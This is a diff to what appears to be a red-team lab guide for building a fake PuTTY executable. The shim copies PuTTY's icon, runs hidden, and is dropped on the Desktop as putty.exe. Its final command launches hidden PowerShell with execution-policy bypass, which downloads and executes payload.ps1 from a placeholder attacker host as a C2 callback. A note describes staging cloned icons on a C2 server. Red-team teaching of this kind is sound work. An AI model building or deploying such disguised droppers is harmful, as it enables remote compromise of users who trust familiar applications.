@@ -166,7 +166,7 @@ Nothing. PowerShell sleeps for two seconds and exits with no visual trace whatso
 
 ---
 
-**Step 3 — `--icon`: Visual Identity Theft**
+**Step 3 — Icon Masquerading: Visual Identity Theft**
 
 Verify that PuTTY is present on the machine before proceeding:
 
@@ -183,10 +183,10 @@ Generate a shim that clones PuTTY's icon but runs `calc.exe` instead:
 
 Open **File Explorer** and navigate to `C:\Users\Public`. You will see `test_icon.exe` bearing the exact PuTTY terminal icon — blue, white, and yellow, pixel-for-pixel identical to the real SSH client in `Program Files`. Double-click it: the Windows Calculator opens.
 
-The filename and icon say PuTTY. The binary runs Calculator. The `--icon` flag does not modify any functionality — it purely exploits the fact that users recognise applications by their icon before they read their filename, let alone inspect their internals.
+The filename and icon say PuTTY. The binary runs Calculator. The `rcedit` utility does not modify any functionality — it purely exploits the fact that users recognise applications by their icon before they read their filename, let alone inspect their internals.
 
 >[!NOTE]
-> `--icon` can point to any `.exe`, `.dll`, or `.ico` file as the icon source. This means an attacker is not limited to impersonating applications that are already installed — icons can be sourced from a pre-downloaded `.ico` file to clone any known application's visual identity, regardless of whether that application is present on the victim machine.
+> The `rcedit` utility applies standalone `.ico` files directly to the target PE binary. This means an attacker is not limited to impersonating applications that are already installed on the endpoint — icons can be pre-harvested and staged on the C2 server (like `putty.ico`) to clone any known application's visual identity, regardless of whether that application exists on the victim machine.
 
 ---
 
@@ -227,7 +227,7 @@ Scroll through the output. Among the binary scaffolding, you will find the exact
 With a clear understanding of each flag's effect, combine them into the final attack binary. This single command synthesises every technique explored in Phase 3:
 
 ```powershell
-.# Generate the proxy executable
+# Generate the proxy executable
 .\shimgen.exe `
   --path    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
   --command "-WindowStyle Hidden -ExecutionPolicy Bypass -c `"IEX(New-Object Net.WebClient).DownloadString('http://<UBUNTU_IP>:8001/payload.ps1')`"" `
@@ -244,7 +244,7 @@ Each flag maps directly back to a capability demonstrated in isolation during Ph
 |---|---|---|
 | `--path powershell.exe` | Step 1 | Legitimate Windows binary used as execution proxy. No malicious executable is involved — only `powershell.exe`, which is trusted and signed by Microsoft. |
 | `--command "..."` | Step 4 | Full C2 callback command hardcoded into the binary. No `.bat`, `.ps1`, or script file is written to disk on the Windows machine. |
-| `--icon putty.exe` | Step 3 | Fake binary is visually indistinguishable from the real PuTTY in File Explorer, on the Desktop, and in the Taskbar. |
+| `rcedit --set-icon` | Step 3 | Fake binary is visually indistinguishable from the real PuTTY in File Explorer, on the Desktop, and in the Taskbar. |
 | `--gui` | Step 2 | Execution is fully invisible. No console window, no flicker, no visual indication that anything happened. |
 | `--output Desktop\putty.exe` | Step 1 | Dropper placed at exactly the location the victim expects PuTTY to be. |
 
